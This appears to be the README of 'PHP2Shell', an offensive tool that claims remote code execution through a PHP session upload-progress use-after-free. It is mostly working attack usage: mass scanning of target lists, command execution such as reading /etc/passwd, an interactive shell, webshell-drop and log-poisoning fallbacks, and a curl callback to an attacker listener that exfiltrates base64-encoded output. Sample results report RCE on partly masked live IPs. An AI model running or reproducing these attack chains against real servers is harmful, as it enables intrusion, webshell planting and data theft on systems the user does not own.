# PHP2Shell

```
     ██████╗  ██╗  ██╗  ██████╗   ██████╗  ███████╗ ██╗  ██╗ ███████╗ ██╗     ██╗
     ██╔══██╗ ██║  ██║  ██╔══██╗ ██╔══██╗  ██╔════╝ ██║  ██║ ██╔════╝ ██║     ██║
     ██████╔╝ ███████║  ██████╔╝ ██████╔╝  █████╗   ███████║ █████╗   ██║     ██║
     ██╔═══╝  ██╔══██║  ██╔══██╗ ██╔══██╗  ██╔══╝   ██╔══██║ ██╔══╝   ██║     ██║
     ██║      ██║  ██║  ██║  ██║ ██████╔╝  ███████╗ ██║  ██║ ███████╗ ███████╗ ███████╗
     ╚═╝      ╚═╝  ╚═╝  ╚═╝  ╚═╝ ╚═════╝   ╚══════╝ ╚═╝  ╚═╝ ╚══════╝ ╚═════╝  ╚═════╝
```

```
        ,---------.
       (  B O M B  )
        `-----\----'
               \
                *      >>  created by 0verDo$ed
```

A multi-target RCE PoC for a heap use-after-free in PHP's `session.upload_progress`
handler.

- CVE-2026-109618 / CVE-2026-109619
- Attack chain: session poison -> race/UAF -> LFI include -> command output
- Fallback paths when no LFI exists: log poisoning, FastCGI direct, PEAR webshell drop
- Supports one target or a whole list piped into the tool
- Color-coded results so you can see quickly which targets are vulnerable and which are not

For authorized security research only. Test only machines you own or have
explicit permission to test.

## Vulnerable PHP versions

This is the most important table in this document. PHP is vulnerable when it
runs with `session.upload_progress.enabled=On` (the default in almost every
distribution until the versions listed below).

| PHP branch | Vulnerable versions | First patched version | Notes                                  |
| ---------- | ------------------- | --------------------- | -------------------------------------- |
| 5.4 - 8.1  | every version       | none (EOL)            | no backport ever, upgrade the branch   |
| 8.2        | <= 8.2.34           | 8.2.35                |                                        |
| 8.3        | <= 8.3.35           | 8.3.36                |                                        |
| 8.4        | <= 8.4.26           | 8.4.27                | default of latest distro images, check |
| 8.5        | <= 8.5.11           | 8.5.12                |                                        |

### How to flag a target with an outdated PHP version

Option 1: use the built-in probe (it fingerprints and flags the version for you):

```bash
python3 poc.py --probe-only http://TARGET/
```

Output example:

```
[  1] VULN-SURFACE  PHP 7.2.34 VULNERABLE (EOL branch, no fix ever)  upl=1  server=Apache/2.4.6 (CentOS) PHP/7.2.34
```

Option 2: check the version header manually:

```bash
curl -sI http://TARGET/ | grep -i "x-powered-by"
# X-Powered-By: PHP/7.2.34
```

Option 3: use the included helper:

```bash
chmod +x check_version.sh
./check_version.sh http://TARGET/
```

Both `poc.py --probe-only` and `check_version.sh` print one of:

- `VULNERABLE` - the version is in range, the bug exists in your PHP build
- `PATCHED` - version is at or past the fix for its branch
- `version ?` - the server hides its PHP version, dig further manually

## Requirements

- Python 3.8 or newer (tested on 3.12)
- That is all, no pip dependencies

## Install

```bash
git clone https://github.com/Sol0-dev/php2shell.git
cd php2shell
chmod +x poc.py check_version.sh
```

## Quick start: single target

```bash
# fingerprint only, no exploitation
python3 poc.py --probe-only http://TARGET/

# full chain, default command is id
python3 poc.py http://TARGET/index.php

# run a specific command
python3 poc.py http://TARGET/index.php "id;hostname"

# specify the LFI parameter if you already know it
python3 poc.py http://TARGET/page.php "cat /etc/passwd" --lfi-param page

# more rounds and faster chunking when the race is tight
python3 poc.py http://TARGET/ "whoami" --rounds 20 --chunk-delay 0.001

# self-signed TLS on internal hosts
python3 poc.py https://TARGET/ "uname -a" --no-verify
```

## Multi-target (list of hosts)

Feed the URL list on stdin or with `--targets`. One URL per line, `#` comments
allowed, blank lines ignored, duplicates removed:

```bash
cat targets.txt | python3 poc.py --probe-only -w 8     # fingerprint the whole list
python3 poc.py --targets targets.txt --probe-only -w 8 # same thing from a file

# full chain against every target, 4 parallel workers
cat targets.txt | python3 poc.py "id" --no-verify -w 4
python3 poc.py --targets targets.txt "id" --workers 4 -w 2
```

At the end you get a color-coded summary:

```
[=] FINAL SUMMARY - 2/18 RCE CONFIRMED (command: 'id')
  [+] RCE     http://161.x.x.x
  [+] RCE     http://154.x.x.x
  [-] no-out  http://107.x.x.x
  ...
```

A single positional word (like `id`) after a piped list is treated as the
command, not as a URL. So this works exactly the way you expect:

```bash
cat targets.txt | python3 poc.py "id"
```

To re-run only the targets that flagged VULNERABLE:

```bash
# step 1, sweep
cat targets.txt | python3 poc.py --probe-only -w 8 | tee sweep.txt

# step 2, grab the HIT lines and exploit them
grep "HIT :" sweep.txt | awk '{print $3}' | python3 poc.py "id" -w 2
```

## Interactive shell

After a confirmed RCE on a single target you can drop into a shell loop:

```bash
python3 poc.py http://TARGET/index.php "id" -i --lfi-param page
# php2shell> uname -a
# php2shell> cat /etc/passwd
# php2shell> exit
```

`--interactive` only works with a single target and needs `--lfi-param`.

## Blind RCE with out-of-band exfil

When the target accepts the poisoned session but the LFI response never shows
command output, exfiltrate over a callback you control:

```bash
# start a listener first
nc -lvnp 8000

# then run the chain with the callback
python3 poc.py http://TARGET/ "id" --callback http://YOUR_IP:8000/exfil --no-verify
```

The command is wrapped as:

```
curl -sk 'http://YOUR_IP:8000/exfil?o=$(id 2>&1|base64 -w0)'
```

Watch the listener for a hit, decode the base64 parameter.

## All flags

| Flag | What it does |
| ---- | ------------ |
| `url` | one target URL, optional when you pipe a list |
| `command` | OS command to run, default is `id` |
| `--targets FILE` | file with one URL per line, same as piping |
| `-w, --workers N` | parallel targets for multi-target runs, default 4 |
| `--lfi-param PARAM` | known LFI parameter name, e.g. `page` |
| `--rounds N` | race rounds, default 5 |
| `--modes` | disturbance modes: `all` or `destroy,regenerate,gc,double,abort` |
| `--chunk-size N` | upload chunk bytes, default 512 |
| `--chunk-delay F` | seconds between chunks, default 0.005 |
| `--probe-only` | fingerprint only, prints VULN-SURFACE / NOT-VULN and PHP verdict |
| `--no-verify` | disable TLS verification for self-signed lab hosts |
| `--cafile FILE` | custom CA bundle |
| `-i, --interactive` | shell loop after first success, single target only |
| `--callback URL` | blind exfil of command output to your listener |

## Reading the output

Colors auto-enable on a terminal. Set `NO_COLOR=1` to disable or
`FORCE_COLOR=1` to force them when piping.

What each stage means:

1. `Stage 0` - the tool fingerprints the target: PHP present, upload progress
   active, session save path discovered, LFI parameters harvested from the page
2. `Round N/M` - each round: new session id, poisoned multipart upload streamed
   slowly, disturber threads race the session lifecycle, LFI polls the session
   file path list until command output appears between the delimiter markers
3. Fallbacks, tried in order when session LFI fails:
   - log poisoning (UA payload into access log, LFI to it)
   - FastCGI direct (auto_prepend_file via exposed FPM port, no LFI needed)
   - PEAR drop (config-create webshell into webroot)
4. Marker strings `php2shell_out_start` and `php2shell_out_end` wrap real
   command output, so the tool never mislabels page noise as a shell

Banner is randomized per run, like an msfconsole splash. Changes on every
invocation.

## How to recreate the lab locally

The `lab/` directory contains a deliberately vulnerable PHP page

```php
session_start();
if (isset($_GET['page'])) { include($_GET['page']); }   // <-- LFI sink
```

with a `LAB_MODE` guard so it refuses to run outside the lab container.

```bash
cd lab
docker compose up -d
# lab listens on 127.0.0.1:8181
curl http://127.0.0.1:8181/
python3 poc.py --probe-only http://127.0.0.1:8181/
python3 poc.py http://127.0.0.1:8181/ "id;hostname" --no-verify
docker compose down
```

Expected fingerprint result: `VULN-SURFACE PHP 8.1.x VULNERABLE (EOL branch)`
since every 8.1 release is affected.

Only run the lab bound to localhost. Do not expose it.

## Notes on false positives

- The PEAR fallback path is only confirmed when the delimiter markers actually
  appear in the response body, so an ordinary page hit is not shown as a shell
- A `5xx` or connection reset during the race means the UAF primitive may have
  fired even without command output, check crash indicators in the final line
- CLI built-in server (`php -S`) does not flush upload progress mid-request,
  use Apache module or PHP-FPM targets when you want reproducible sessions

## License and credits

MIT. Created by 0verDo$ed.

Use responsibly: only test systems you are authorized to test. No denial of
service, no destructive payloads, obey the program rules of any bug bounty
engagement and all applicable laws.
